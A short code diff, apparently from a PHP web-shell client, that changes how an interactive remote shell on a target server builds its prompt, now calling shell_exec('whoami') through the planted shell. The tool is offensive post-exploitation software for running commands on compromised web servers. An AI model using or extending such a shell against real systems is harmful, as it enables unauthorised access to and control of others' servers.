@@ -10,12 +10,12 @@ def run():
     Get a temporary shell of target system by system function.
     """
     print(color.cyan("Eenter interactive temporary shell...\n"))
-    res = send(f'print($_SERVER["SERVER_ADMIN"]."|".getcwd());').r_text.strip()
+    res = send(f'print(shell_exec("whoami")."@".$_SERVER["SERVER_NAME"]."|".getcwd());').r_text.strip()
     prompt, pwd = res.split("|")
     if is_windows():
         prompt = "%s> "
     else:
-        prompt += ":%s$ "
+        prompt = prompt.strip() + ":%s$ "
     while gget("loop"):
         data = input(prompt % pwd)
         lower_data = data.lower()
